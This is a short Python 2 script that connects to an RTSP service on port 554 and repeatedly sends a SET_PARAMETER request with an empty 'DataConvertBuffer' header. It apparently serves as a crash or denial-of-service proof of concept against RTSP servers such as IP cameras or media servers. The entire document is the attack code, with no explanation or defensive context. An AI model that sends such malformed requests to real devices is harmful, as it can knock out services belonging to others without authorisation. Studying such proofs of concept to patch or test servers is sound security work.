import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('example.com',554))

setRequest = "SET_PARAMETER / RTSP/1.0\r\n"
setRequest +="DataConvertBuffer: \r\n\r\n"

for i in range(5):
  print i
  s.send(setRequest)

s.close()
